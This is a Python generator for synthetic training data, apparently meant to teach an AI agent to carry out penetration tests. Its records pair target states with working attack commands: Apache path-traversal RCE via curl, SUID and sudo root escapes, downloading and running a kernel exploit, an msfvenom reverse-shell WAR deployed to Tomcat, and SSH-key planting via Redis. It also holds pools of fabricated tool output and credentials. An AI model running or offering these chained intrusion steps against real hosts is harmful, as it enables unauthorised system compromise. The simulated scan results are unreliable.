         "synthesis": "Apache 2.4.49 CVE-2021-41773 confirmed — path traversal to RCE", "action": "curl -s 'http://{ip}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo;id'"},
        {"phase": "PRIVILEGE_ESCALATION", "state": "Shell: www-data@target\nSUID: /usr/bin/env", "memory": "env SUID: instant root via /usr/bin/env /bin/sh -p. GTFOBins confirmed.",
         "synthesis": "Direct root via env SUID — no further enumeration needed", "action": "/usr/bin/env /bin/sh -p"},
        {"phase": "PRIVILEGE_ESCALATION", "state": "Shell: user@target\nsudo -l: (ALL) NOPASSWD: /usr/bin/awk", "memory": "awk sudo escape: sudo awk 'BEGIN {system(\"/bin/bash\")}'.",
         "synthesis": "awk sudo misconfiguration gives root shell via BEGIN block", "action": "sudo awk 'BEGIN {system(\"/bin/bash\")}'"},
        {"phase": "PRIVILEGE_ESCALATION", "state": "Shell: user@target\nKernel: Linux 4.15.0-20-generic", "memory": "Kernel 4.15.0-20 vulnerable to CVE-2021-3493 OverlayFS. Use exploit from github.",
         "synthesis": "Kernel version matches known OverlayFS exploit — high confidence root path", "action": "wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c -O /tmp/exploit.c && gcc /tmp/exploit.c -o /tmp/exploit && /tmp/exploit"},
        {"phase": "LATERAL_MOVEMENT", "state": "Shell: root@10.10.10.5\nCredentials: admin:pass123\nNew target: 10.10.10.20", "memory": "Credential reuse is the fastest lateral movement technique. Try SSH first, then SMB.",
         "synthesis": "Reuse discovered credentials against adjacent host — SSH most reliable", "action": "ssh admin@10.10.10.20 -o StrictHostKeyChecking=no"},
        {"phase": "POST_EXPLOITATION", "state": "Shell: root@target\nFlags: user.txt found\nMissing: root.txt", "memory": "root.txt usually in /root/root.txt. Also check /home/*/root.txt and /root/flag.txt.",
         "synthesis": "Standard flag location for root proof", "action": "cat /root/root.txt 2>/dev/null || find / -name 'root.txt' -o -name 'proof.txt' 2>/dev/null"},
        {"phase": "ENUMERATION", "state": "Ports: 25, 110, 143\nServices: Postfix SMTP, Dovecot IMAP", "memory": "Mail services: enumerate users via SMTP VRFY/EXPN. Check for open relay.",
         "synthesis": "Mail server stack — SMTP user enumeration can reveal valid accounts", "action": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {ip}"},
        {"phase": "EXPLOITATION", "state": "Vuln: Tomcat manager accessible\nCredentials: tomcat:s3cret", "memory": "Tomcat manager: deploy malicious WAR file for webshell. Use msfvenom to generate.",
         "synthesis": "Tomcat manager with valid credentials — WAR deployment for shell", "action": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war -o shell.war && curl -u 'tomcat:s3cret' --upload-file shell.war 'http://{ip}:8080/manager/text/deploy?path=/shell'"},
        {"phase": "EXPLOITATION", "state": "Ports: 6379\nServices: Redis 6.0 (no auth)", "memory": "Redis without auth: write SSH key to /root/.ssh/authorized_keys for root access.",
         "synthesis": "Unauthenticated Redis — write SSH key for direct root access", "action": "redis-cli -h {ip} CONFIG SET dir /root/.ssh/ && redis-cli -h {ip} CONFIG SET dbfilename authorized_keys"},
    ]

    for p in patterns:
        for _ in range(rng.randint(5, 10)):
            ip = _rand_ip()
            agent = _pick_agent(p["phase"], "retrieval_reasoning")

            state = f"Phase: {p['phase']}\nTarget: {ip}\nStep: {rng.randint(5, 80)}\n{p['state']}"
            action = p["action"].replace("{ip}", ip)

            response = json.dumps({
                "synthesis": p["synthesis"][:250],
                "from_current": p["state"][:150],
                "from_memory": p["memory"][:200],
                "action": action[:200],
                "confidence": round(rng.uniform(0.7, 0.97), 2),
            })

            samples.append(Sample(
                task="retrieval_reasoning",
                messages=[
                    {"role": "system", "content": _sys("retrieval_reasoning", agent)},
                    {"role": "user", "content": f"Current state:\n{state}\n\nPrior experience: {p['memory']}\n\nSynthesize guidance."},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": p["phase"], "synthetic": True, "agent": agent, "source": "synthetic_retrieval"},
                quality=0.93,
            ))

    return samples


# ══════════════════════════════════════════════════════════════════════════════
# EXTENDED SYNTHETIC GENERATORS V2 — Dynamic Component Assembly
# Each sample is genuinely unique via randomized component mixing
# ══════════════════════════════════════════════════════════════════════════════

# ── Shared Component Pools ───────────────────────────────────────────────────

_PORT_SVC: dict[int, tuple[str, list[str]]] = {
    21: ("ftp", ["vsftpd 3.0.3", "vsftpd 2.3.4", "ProFTPD 1.3.5", "Pure-FTPd 1.0.49", "FileZilla ftpd 0.9.60"]),
    22: ("ssh", ["OpenSSH 7.2p2 Ubuntu", "OpenSSH 8.2p1 Ubuntu", "OpenSSH 9.0", "OpenSSH 7.9p1 Debian", "Dropbear 2019.78", "OpenSSH 8.9p1"]),
    23: ("telnet", ["Linux telnetd", "BusyBox telnetd"]),
    25: ("smtp", ["Postfix smtpd", "Exim 4.92", "sendmail 8.15.2", "hMailServer 5.6", "Haraka 2.8.28"]),
    53: ("domain", ["BIND 9.16.1", "dnsmasq 2.80", "Unbound 1.13.1", "PowerDNS 4.5"]),
    80: ("http", [
        "Apache httpd 2.4.41 ((Ubuntu))", "Apache httpd 2.4.49", "Apache httpd 2.4.50",
        "nginx 1.18.0 (Ubuntu)", "nginx 1.21.3", "nginx 1.14.0",
        "Microsoft IIS httpd 10.0", "Microsoft IIS httpd 8.5",
        "Werkzeug 1.0.1 Python 3.8.10", "Werkzeug 2.0.2 Python 3.9.7",
        "Apache Tomcat 9.0.30", "Apache Tomcat 8.5.50",
        "lighttpd 1.4.55", "LiteSpeed", "Caddy 2.4.6", "Gunicorn 20.1.0",
    ]),
    110: ("pop3", ["Dovecot pop3d", "Courier pop3d"]),
    111: ("rpcbind", ["rpcbind 2-4"]),
    135: ("msrpc", ["Microsoft Windows RPC"]),
    139: ("netbios-ssn", ["Samba smbd 4.7.6-Ubuntu", "Samba smbd 3.0.20-Debian", "Samba smbd 4.15.2"]),
    143: ("imap", ["Dovecot imapd 2.3.7", "Dovecot imapd 2.2.36", "Courier imapd"]),
    161: ("snmp", ["SNMPv2c", "SNMPv1"]),
    389: ("ldap", ["OpenLDAP 2.4.44", "Microsoft Windows Active Directory LDAP"]),
    443: ("ssl/http", ["Apache httpd 2.4.41 ssl", "nginx 1.18.0 ssl", "Microsoft IIS 10.0 ssl"]),
    445: ("microsoft-ds", ["Samba 4.7.6", "Samba 3.0.20-Debian", "Windows Server 2019 Build 17763", "Samba 4.15.2"]),
    512: ("exec", ["netkit-rsh rexecd"]),
    513: ("login", ["netkit-rsh rlogind"]),
    631: ("ipp", ["CUPS 2.3"]),
    873: ("rsync", ["rsync 3.1.3"]),
    993: ("ssl/imap", ["Dovecot imapd"]),
    1099: ("java-rmi", ["Java RMI Registry"]),
    1433: ("ms-sql-s", ["Microsoft SQL Server 2019 15.0", "Microsoft SQL Server 2017 14.0"]),
    1521: ("oracle-tns", ["Oracle TNS listener 11.2"]),
    2049: ("nfs", ["NFS 3-4", "NFS 2-4"]),
    3000: ("http", ["Node.js Express 4.17.1", "Grafana 8.2.0", "Gitea 1.14.2", "ntopng"]),
    3306: ("mysql", ["MySQL 5.7.38", "MySQL 8.0.28", "MariaDB 10.5.15", "MariaDB 10.3.31"]),
    3389: ("ms-wbt-server", ["Microsoft Terminal Services", "xrdp 0.9.17"]),
    5432: ("postgresql", ["PostgreSQL 13.4 on x86_64", "PostgreSQL 14.1", "PostgreSQL 12.9"]),
    5900: ("vnc", ["VNC (protocol 3.8)", "VNC (protocol 3.3)"]),
    5985: ("http", ["Microsoft HTTPAPI httpd 2.0"]),
    6379: ("redis", ["Redis key-value store 6.0.16", "Redis key-value store 5.0.7", "Redis key-value store 7.0.0"]),
    6667: ("irc", ["UnrealIRCd 3.2.8.1", "InspIRCd 2.0"]),
    8000: ("http", ["SimpleHTTPServer 0.6 Python 3.9", "Django 3.2", "BaseHTTPServer 0.6 Python 3.8"]),
    8080: ("http-proxy", ["Apache Tomcat 9.0.30", "Jetty 9.4.41", "WildFly 23.0.2", "Jenkins 2.289"]),
    8443: ("ssl/http", ["Apache Tomcat 9.0.30 ssl"]),
    8888: ("http", ["Jupyter Notebook 6.4.0", "aiohttp 3.7.4"]),
    9090: ("http", ["Prometheus", "Cockpit web service", "Openfire 4.6"]),
    9200: ("http", ["Elasticsearch REST API 7.17.0", "Elasticsearch REST API 7.10.2"]),
    11211: ("memcache", ["Memcached 1.6.9", "Memcached 1.5.22"]),
    27017: ("mongodb", ["MongoDB 4.4.6", "MongoDB 5.0.3", "MongoDB 3.6.23"]),
    50000: ("http", ["Jenkins 2.289.3", "SAP NetWeaver"]),
}

_USERNAMES_POOL = [
    "admin", "root", "user", "test", "backup", "www-data", "ftp", "postgres", "mysql",
    "tomcat", "jenkins", "git", "deploy", "operator", "svc_admin", "nathan", "mark",
    "john", "alice", "bob", "dave", "mike", "sarah", "james", "alex", "charlie",
    "webadmin", "ftpuser", "dbadmin", "sysadmin", "guest", "oracle", "nagios",
    "zabbix", "ansible", "docker", "redis", "elasticsearch", "grafana", "prometheus",
    "service", "app", "web", "api", "dev", "staging", "ci", "monitor", "security",
]

_PASSWORDS_POOL = [
    "admin", "password", "Password1", "letmein", "123456", "root", "toor", "changeme",
    "P@ssw0rd", "s3cr3t", "Summer2023!", "Winter2024!", "Welcome1", "trustno1", "abc123",
    "qwerty", "monkey", "dragon", "master", "iloveyou", "sunshine", "princess",
    "Company123", "B@ckup2023", "password1", "admin123", "pass123", "test123",
    "Passw0rd!", "Welcome123", "Default1", "secret", "Guest1", "temp1234",
    "hunter2", "baseball", "shadow1", "michael1", "football1",
]

_WEB_PATHS_POOL = [
    "/admin", "/login", "/login.php", "/dashboard", "/api", "/api/v1", "/api/v2",
    "/uploads", "/upload.php", "/images", "/config.php", "/config", "/configuration.php",
    "/backup", "/backup.sql", "/backup.zip", "/data", "/files", "/console",
    "/manager", "/manager/html", "/phpmyadmin", "/pma", "/adminer.php",
    "/wp-admin", "/wp-login.php", "/wp-content", "/wp-includes", "/xmlrpc.php",
    "/robots.txt", "/.git/HEAD", "/.git/config", "/.env", "/.env.bak",
    "/server-status", "/server-info", "/cgi-bin", "/cgi-bin/test.cgi",
    "/test", "/test.php", "/info.php", "/phpinfo.php",
    "/.htpasswd", "/.htaccess", "/sitemap.xml", "/graphql", "/swagger",
    "/swagger-ui.html", "/api-docs", "/debug", "/actuator", "/actuator/env",
    "/solr/admin", "/jenkins", "/jmx-console", "/vendor", "/shell.php",
    "/database.sql", "/dump.sql", "/readme.html", "/CHANGELOG.md",
    "/crossdomain.xml", "/web.config", "/WEB-INF/web.xml",
]

_SUID_POOL = [
    "/usr/bin/python3", "/usr/bin/python3.8", "/usr/bin/python3.9", "/usr/bin/python2.7",
    "/usr/bin/perl", "/usr/bin/ruby", "/usr/bin/env", "/usr/bin/find", "/usr/bin/vim",
    "/usr/bin/vim.basic", "/usr/bin/nmap", "/usr/bin/less", "/usr/bin/more",
    "/usr/bin/awk", "/usr/bin/gawk", "/usr/bin/gdb", "/usr/bin/strace",
    "/usr/bin/pkexec", "/usr/bin/at", "/usr/sbin/exim4", "/usr/bin/screen",
    "/usr/bin/base64", "/usr/bin/wget", "/usr/bin/curl", "/usr/bin/php",
    "/usr/bin/node", "/usr/bin/lua5.3", "/usr/bin/systemctl", "/usr/bin/journalctl",
    "/usr/bin/cp", "/usr/bin/mv", "/usr/bin/tee", "/usr/bin/ed",
]

_SUDO_POOL = [
    "(ALL) NOPASSWD: /usr/bin/vim", "(ALL) NOPASSWD: /usr/bin/vi",
    "(ALL) NOPASSWD: /usr/bin/env", "(ALL) NOPASSWD: /usr/bin/python3",
    "(ALL) NOPASSWD: /usr/bin/awk", "(ALL) NOPASSWD: /usr/bin/find",
    "(ALL) NOPASSWD: /usr/bin/less", "(ALL) NOPASSWD: /usr/bin/more",
    "(ALL) NOPASSWD: /usr/bin/nmap", "(ALL) NOPASSWD: /usr/bin/perl",
    "(ALL) NOPASSWD: /usr/bin/ruby", "(ALL) NOPASSWD: /usr/bin/man",
    "(ALL) NOPASSWD: /usr/bin/ftp", "(ALL) NOPASSWD: /usr/bin/socat",
    "(ALL) NOPASSWD: /usr/bin/wget", "(ALL) NOPASSWD: /usr/bin/curl",
    "(ALL) NOPASSWD: /usr/bin/zip", "(ALL) NOPASSWD: /usr/bin/tar",
    "(ALL) NOPASSWD: /usr/bin/tee", "(ALL) NOPASSWD: /usr/bin/git",
    "(ALL) NOPASSWD: /usr/bin/ssh", "(ALL) NOPASSWD: /usr/bin/tmux",
    "(root) NOPASSWD: /usr/bin/journalctl", "(root) NOPASSWD: /bin/systemctl",
    "(ALL) NOPASSWD: /usr/bin/apt-get", "(ALL) NOPASSWD: /usr/bin/pip",
    "(ALL) NOPASSWD: /usr/bin/node", "(ALL) NOPASSWD: /usr/bin/php",
    "(ALL) NOPASSWD: /usr/bin/screen", "(ALL) NOPASSWD: /usr/bin/base64",
    "(ALL) NOPASSWD: /usr/bin/nano", "(ALL) NOPASSWD: /usr/bin/expect",
]

_CAP_POOL = [
    ("cap_setuid+ep", "os.setuid(0) for root"),
    ("cap_setuid+eip", "os.setuid(0) for root"),
    ("cap_net_raw+ep", "raw socket access"),
    ("cap_dac_read_search+ep", "read any file"),
    ("cap_sys_admin+ep", "mount/debug/ptrace"),
    ("cap_sys_ptrace+ep", "ptrace any process"),
    ("cap_fowner+ep", "bypass file ownership checks"),
]

_KERNEL_VULN_POOL = [
    ("4.15.0-20-generic", "CVE-2021-3493", "OverlayFS"),
    ("4.4.0-116-generic", "CVE-2017-16995", "BPF sign extension"),
    ("3.13.0-24-generic", "CVE-2015-1328", "OverlayFS"),
    ("5.4.0-42-generic", "CVE-2022-0847", "DirtyPipe"),
    ("5.8.0-48-generic", "CVE-2022-0847", "DirtyPipe"),
    ("4.8.0-58-generic", "CVE-2017-1000112", "UDP fragmentation"),
    ("3.2.0-4-amd64", "CVE-2016-5195", "DirtyCow"),
    ("4.10.0-28-generic", "CVE-2017-16995", "BPF sign extension"),
    ("5.10.0-8-amd64", "CVE-2022-0847", "DirtyPipe"),
    ("4.19.0-17-amd64", "CVE-2021-3493", "OverlayFS"),
    ("5.15.0-25-generic", "CVE-2022-2588", "route4 UAF"),
    ("4.9.0-11-amd64", "CVE-2017-7308", "AF_PACKET"),
]

_EXPLOITSEARCH_DB = [
    ("vsftpd 2.3.4", ["vsftpd 2.3.4 - Backdoor Command Execution | linux/remote/17491.rb"]),
    ("Apache 2.4.49", ["Apache HTTP Server 2.4.49 - Path Traversal & RCE | multiple/webapps/50383.sh"]),
    ("Apache 2.4.50", ["Apache HTTP Server 2.4.50 - Path Traversal & RCE | multiple/webapps/50406.sh"]),
    ("OpenSSH 7.2p2", ["OpenSSH 7.2p2 - Username Enumeration | linux/remote/40136.py"]),
    ("Samba 3.0.20", ["Samba 3.0.20 < 3.0.25rc3 - 'Username' map script | unix/remote/16320.rb"]),
    ("ProFTPD 1.3.5", ["ProFTPD 1.3.5 - 'mod_copy' Remote Command Execution | linux/remote/37262.rb"]),
    ("Drupal 7", ["Drupalgeddon2 - Remote Code Execution | php/webapps/44449.rb"]),
    ("Exim 4.92", ["Exim 4.87-4.91 - Local Privilege Escalation | linux/local/46996.sh"]),
    ("Tomcat 9.0", ["Apache Tomcat - AJP 'Ghostcat' File Read | multiple/webapps/48143.py"]),
    ("UnrealIRCd 3.2.8.1", ["UnrealIRCd 3.2.8.1 - Backdoor Command Execution | linux/remote/16922.rb"]),
    ("Nagios XI 5.6", ["Nagios XI 5.6.x - Remote Code Execution | linux/webapps/46221.py"]),
    ("Jenkins 2.289", ["Jenkins < 2.303 - RCE via Groovy Script Console | java/webapps/49786.py"]),
    ("Elasticsearch 7.10", ["Elasticsearch < 7.14 - Log4Shell RCE | java/webapps/50512.py"]),
    ("phpMyAdmin 4.8", ["phpMyAdmin 4.8.x - Local File Inclusion | php/webapps/44928.txt"]),
    ("Webmin 1.890", ["Webmin < 1.920 - Unauthenticated RCE | linux/remote/47230.rb"]),
]

_WP_PLUGIN_VULNS = [
    ("wp-file-manager", "6.7", "CVE-2020-25213", "RCE via file upload"),
    ("revslider", "4.7.4", "CVE-2014-9734", "Arbitrary file download"),
    ("duplicator", "1.3.26", "CVE-2020-11738", "Unauthenticated file download"),
    ("social-warfare", "3.5.0", "CVE-2019-9978", "RCE via stored XSS"),
    ("easy-wp-smtp", "1.3.9", "CVE-2019-19521", "Auth bypass"),
    ("wpgateway", "3.5", "CVE-2022-3180", "Privilege escalation"),
    ("wp-symposium", "15.1", "CVE-2015-1579", "SQL injection"),
    ("mail-masta", "1.0", "CVE-2016-10956", "Local File Inclusion"),
    ("gracemedia-player", "1.0", "CVE-2019-9618", "LFI"),
    ("developer-flavor", "1.2", "CVE-2021-24145", "Arbitrary file upload"),
]


def gen_synthetic_tool_outputs_v2() -> list[Sample]:
    """2000+ unique tool output parsing via dynamic component assembly."""
    samples: list[Sample] = []
    rng = random.Random(SEED + 100)

    def _nmap(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        n = r.randint(2, 7)
        ports = sorted(r.sample(list(_PORT_SVC.keys()), min(n, len(_PORT_SVC))))
        lines = ["PORT     STATE SERVICE      VERSION"]
        disc = []
        for p in ports:
            svc, vers = _PORT_SVC[p]
            v = r.choice(vers)
            lines.append(f"{p}/tcp   open  {svc:<12} {v}")
            disc.append({"type": "port", "value": f"{p}/tcp {svc} open", "confidence": 0.99})
            disc.append({"type": "service", "value": v, "confidence": 0.99})
        scan = r.choice(["-sV -sC", "-sV -sC -p-", "-A", "-sV -O", "-sS -sV", "-sV --top-ports 1000"])
        return f"nmap {scan} {ip}", "\n".join(lines), disc[:8], "advance" if len(ports) >= 3 else "stay", f"Found {len(ports)} open ports on {ip}"

    def _web_enum(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        tool = r.choice(["gobuster", "ffuf", "feroxbuster", "dirb"])
        paths = r.sample(_WEB_PATHS_POOL, r.randint(3, 8))
        lines, disc = [], []
        for path in paths:
            status = r.choice([200, 200, 301, 301, 302, 403])
            size = r.randint(0, 50000)
            lines.append(f"{path:<25} (Status: {status}) [Size: {size}]")
            disc.append({"type": "file", "value": f"{path} ({status})", "confidence": round(r.uniform(0.8, 0.95), 2)})
        wl = r.choice(["directory-list-2.3-medium.txt", "raft-large-words.txt", "common.txt"])
        return f"{tool} dir -u http://{ip} -w /usr/share/wordlists/{wl}", "\n".join(lines), disc[:6], "stay", f"{tool} found {len(paths)} paths"

    def _smb_enum(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        tool = r.choice(["enum4linux", "smbclient", "crackmapexec"])
        users = r.sample(_USERNAMES_POOL, r.randint(1, 5))
        disc, lines = [], []
        if tool == "enum4linux":
            lines.append(f"[+] Server {ip} allows sessions using username '', password ''")
            disc.append({"type": "credential", "value": "anonymous SMB access (null session)", "confidence": 0.95})
            for u in users:
                rid = hex(r.randint(0x3e8, 0xfff))
                lines.append(f"user:[{u}] rid:[{rid}]")
                disc.append({"type": "user", "value": f"{u} (rid:{rid})", "confidence": 0.95})
            shares = r.sample(["tmp", "opt", "www", "backup", "data", "IPC$", "print$"], r.randint(1, 4))
            for s in shares:
                acc = r.choice(["OK", "OK", "DENIED"])
                lines.append(f"//{ip}/{s}  Mapping: {acc}")
                if acc == "OK":
                    disc.append({"type": "file", "value": f"//{ip}/{s} accessible", "confidence": 0.9})
            cmd = f"enum4linux -a {ip}"
        elif tool == "smbclient":
            shares = r.sample(["tmp", "www", "data", "backup", "IPC$", "profiles", "shared"], r.randint(1, 4))
            lines.append("Sharename       Type      Comment")
            for s in shares:
                lines.append(f"{s:<15} Disk")
                disc.append({"type": "file", "value": f"{s} share", "confidence": 0.9})
            cmd = f"smbclient -L //{ip}/ -N"
        else:
            lines.append(f"SMB         {ip}    445    TARGET")
            if r.random() > 0.4:
                u, p = r.choice(_USERNAMES_POOL[:10]), r.choice(_PASSWORDS_POOL[:10])
                lines.append(f"SMB         {ip}    445    [+] {u}:{p}")
                disc.append({"type": "credential", "value": f"{u}:{p} (SMB)", "confidence": 0.99})
            else:
                lines.append(f"SMB         {ip}    445    [-] admin:password STATUS_LOGON_FAILURE")
            cmd = f"crackmapexec smb {ip} -u admin -p password"
        return cmd, "\n".join(lines), disc[:6], "advance" if disc else "stay", f"SMB enum: {len(users)} users found"

    def _hydra(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        proto = r.choice(["ssh", "ftp", "http-post-form", "smb", "rdp", "mysql", "pop3", "vnc", "telnet"])
        u, p = r.choice(_USERNAMES_POOL[:15]), r.choice(_PASSWORDS_POOL)
        port = {"ssh": 22, "ftp": 21, "smb": 445, "rdp": 3389, "mysql": 3306, "pop3": 110, "vnc": 5900, "telnet": 23}.get(proto, 80)
        found = r.random() > 0.3
        if found:
            lines = [f"[DATA] attacking {proto}://{ip}:{port}/", f"[{port}][{proto}] host: {ip}   login: {u}   password: {p}", "1 of 1 target completed, 1 valid password found"]
            disc = [{"type": "credential", "value": f"{u}:{p} ({proto})", "confidence": 0.99}]
            summary = f"Brute force success: {u}/{p} on {proto}"
        else:
            lines = [f"[DATA] attacking {proto}://{ip}:{port}/", "0 valid passwords found"]
            disc = []
            summary = f"Brute force against {proto} unsuccessful"
        return f"hydra -l {u} -P /usr/share/wordlists/rockyou.txt {ip} {proto}", "\n".join(lines), disc, "advance" if found else "stay", summary

    def _sqlmap(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        param = r.choice(["id", "page", "user", "cat", "item", "article", "product", "search", "q", "file", "view"])
        page = r.choice(["/login.php", "/index.php", "/page.php", "/search.php", "/view.php", "/product.php", "/user.php", "/details.php", "/show.php"])
        types = r.sample(["boolean-based blind", "time-based blind", "UNION query", "error-based", "stacked queries"], r.randint(1, 3))
        dbs = r.sample(["information_schema", "mysql", "webapp", "users_db", "shop", "blog", "cms", "app_data", "employees", "inventory"], r.randint(2, 4))
        lines = [f"[INFO] the back-end DBMS is MySQL", f"back-end DBMS: MySQL >= 5.0", f"available databases [{len(dbs)}]:"]
        for db in dbs:
            lines.append(f"[*] {db}")
        lines.append(f"Parameter: {param} (GET)")
        for t in types:
            lines.append(f"    Type: {t}")
        disc = [{"type": "vuln", "value": f"SQL injection on {page}?{param}= ({', '.join(types)})", "confidence": 0.99},
                {"type": "service", "value": "MySQL >= 5.0 backend", "confidence": 0.95}]
        lvl = r.choice(["", " --level=3 --risk=2", " --level=5 --risk=3"])
        return f"sqlmap -u 'http://{ip}{page}?{param}=1' --batch --dbs{lvl}", "\n".join(lines), disc, "advance", f"SQLi confirmed on {page}: {', '.join(types)}"

    def _linpeas(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        disc, lines = [], []
        user = r.choice(["www-data", "user", "www", r.choice(_USERNAMES_POOL[:10])])
        if r.random() > 0.35:
            sudo = r.choice(_SUDO_POOL)
            lines.extend([f"╔══════════╣ Checking sudo privileges", f"User {user} may run:", f"    {sudo}"])
            disc.append({"type": "vuln", "value": f"sudo NOPASSWD: {sudo.split(': ')[-1]}", "confidence": 0.99})
        if r.random() > 0.3:
            suids = r.sample(_SUID_POOL, r.randint(1, 3))
            lines.append("╔══════════╣ SUID")
            for s in suids:
                lines.append(f"-rwsr-xr-x 1 root root {r.randint(10000, 90000)} {s}")
                disc.append({"type": "vuln", "value": f"{s} SUID", "confidence": 0.9})
        if r.random() > 0.4:
            binary = r.choice(["/usr/bin/python3", "/usr/bin/python3.8", "/usr/bin/perl", "/usr/bin/ruby", "/usr/bin/node"])
            cap, desc = r.choice(_CAP_POOL)
            lines.extend(["╔══════════╣ Capabilities", f"{binary} = {cap}"])
            disc.append({"type": "vuln", "value": f"{binary} {cap} ({desc})", "confidence": 0.95})
        if r.random() > 0.5:
            script = r.choice(["/opt/scripts/backup.sh", "/var/scripts/cleanup.sh", "/usr/local/bin/monitor.sh", "/opt/maintenance/update.sh", "/home/user/scripts/sync.sh", "/etc/cron.d/logrotate-custom"])
            lines.extend(["╔══════════╣ Cron jobs", f"* * * * * root {script}"])
            disc.append({"type": "vuln", "value": f"root cron: {script}", "confidence": 0.85})
        kern = r.choice(_KERNEL_VULN_POOL)
        lines.extend(["╔══════════╣ Kernel", f"Linux version {kern[0]}"])
        disc.append({"type": "vuln", "value": f"Kernel {kern[0]} ({kern[1]} {kern[2]})", "confidence": 0.75})
        if not disc:
            disc.append({"type": "vuln", "value": "No obvious escalation vectors", "confidence": 0.3})
        return "./linpeas.sh", "\n".join(lines), disc[:6], "advance" if len(disc) >= 2 else "stay", f"Privesc enum: {len(disc)} vectors"

    def _nikto(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        server = r.choice(["Apache/2.4.41", "Apache/2.4.49", "nginx/1.18.0", "IIS/10.0", "Apache/2.4.50", "nginx/1.21.3", "LiteSpeed"])
        pool = [
            ("config file found", "file"), ("/phpmyadmin/ found", "file"),
            ("Directory listing enabled", "file"), ("CGI file found", "file"),
            ("Possible webshell found", "vuln"), ("x-debug-token header", "vuln"),
            ("X-Frame-Options missing", "vuln"), ("Server leaks inodes via ETags", "vuln"),
            ("/server-status accessible", "vuln"), (".env file exposed", "vuln"),
            (".git/HEAD accessible", "vuln"), ("/backup/ listing", "file"),
            ("phpinfo.php found", "file"), ("Default Apache page", "file"),
            ("PUT method allowed", "vuln"), ("WebDAV enabled", "vuln"),
            ("TRACE method enabled", "vuln"), ("/icons/README found", "file"),
        ]
        findings = r.sample(pool, r.randint(3, 7))
        lines, disc = [f"+ Server: {server}"], []
        for text, dtype in findings:
            path = r.choice(_WEB_PATHS_POOL[:20])
            lines.append(f"+ {path}: {text}")
            disc.append({"type": dtype, "value": f"{path}: {text}"[:80], "confidence": round(r.uniform(0.7, 0.95), 2)})
        return f"nikto -h http://{ip}", "\n".join(lines), disc[:6], "advance", f"Nikto: {len(findings)} findings on {server}"

    def _wpscan(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        ver = r.choice(["5.7.2", "5.8.1", "5.9.3", "6.0.1", "6.1.1", "5.6.0", "5.5.3", "5.4.2"])
        users = r.sample(_USERNAMES_POOL[:10], r.randint(1, 3))
        plugins = r.sample(_WP_PLUGIN_VULNS, r.randint(1, 4))
        safe_plugins = r.sample([("contact-form-7", "5.3.2"), ("elementor", "3.1.0"), ("updraftplus", "1.22.3"), ("akismet", "4.1.9"), ("yoast-seo", "17.2.1")], r.randint(0, 2))
        lines, disc = [f"[+] WordPress version {ver} identified", "[i] User(s) Identified:"], [{"type": "service", "value": f"WordPress {ver}", "confidence": 0.99}]
        for u in users:
            lines.append(f"[+] {u}")
            disc.append({"type": "user", "value": f"{u} (WordPress)", "confidence": 0.95})
        lines.append("[+] Plugins:")
        for name, pver, cve, desc in plugins:
            lines.append(f"[+] {name} {pver} (vulnerable: {cve})")
            disc.append({"type": "vuln", "value": f"{name} {pver} {cve} ({desc})", "confidence": 0.98})
        for name, pver in safe_plugins:
            lines.append(f"[+] {name} {pver}")
        return f"wpscan --url http://{ip} --enumerate u,p,t", "\n".join(lines), disc[:6], "advance" if plugins else "stay", f"WordPress {ver}: {len(plugins)} vulnerable plugins"

    def _tshark(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip1, ip2 = _rand_ip(), _rand_ip()
        disc, lines = [], []
        proto = r.choice(["ftp", "http", "telnet", "smtp", "pop3"])
        if proto == "ftp":
            u, p = r.choice(_USERNAMES_POOL[:10]), r.choice(_PASSWORDS_POOL)
            lines.extend([f"{ip1}\t{ip2}\tUSER\t{u}", f"{ip1}\t{ip2}\tPASS\t{p}", f"{ip1}\t{ip2}\tRETR\t{r.choice(['notes.txt', 'config.txt', 'backup.sql', 'id_rsa', 'passwords.txt'])}"])
            disc.append({"type": "credential", "value": f"{u}:{p} (FTP cleartext)", "confidence": 0.99})
        elif proto == "http":
            paths = r.sample(["/admin/dashboard", "/api/v1/users", "/login", "/api/auth", "/internal/config", "/api/keys", "/debug/vars"], r.randint(2, 4))
            for path in paths:
                lines.append(f"{ip1}\t{ip2}\t\t\t{path}")
                disc.append({"type": "file", "value": f"{path} (HTTP)", "confidence": 0.8})
            if r.random() > 0.5:
                u, p = r.choice(_USERNAMES_POOL[:10]), r.choice(_PASSWORDS_POOL)
                lines.append(f"# HTTP POST /login: username={u}&password={p}")
                disc.insert(0, {"type": "credential", "value": f"{u}:{p} (HTTP POST)", "confidence": 0.95})
        elif proto == "telnet":
            u, p = r.choice(_USERNAMES_POOL[:10]), r.choice(_PASSWORDS_POOL)
            lines.extend([f"login: {u}", f"Password: {p}", f"{u}@target:~$"])
            disc.append({"type": "credential", "value": f"{u}:{p} (Telnet cleartext)", "confidence": 0.99})
        else:
            u = r.choice(_USERNAMES_POOL[:5])
            lines.extend([f"EHLO attacker", f"MAIL FROM:<{u}@target.com>", f"RCPT TO:<admin@target.com>"])
            disc.append({"type": "user", "value": f"{u}@target.com ({proto.upper()} valid)", "confidence": 0.85})
        return f"tshark -r capture.pcap -Y '{proto}'", "\n".join(lines), disc[:5], "advance" if any(d["type"] == "credential" for d in disc) else "stay", f"PCAP: {proto.upper()} traffic with {len(disc)} findings"

    def _searchsploit(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        svc_name, results = r.choice(_EXPLOITSEARCH_DB)
        lines = [f"{'Exploit Title':<55} | {'Path'}"]
        disc = []
        for result in results:
            lines.append(result)
            disc.append({"type": "vuln", "value": result.split(" | ")[0].strip()[:80], "confidence": 0.85})
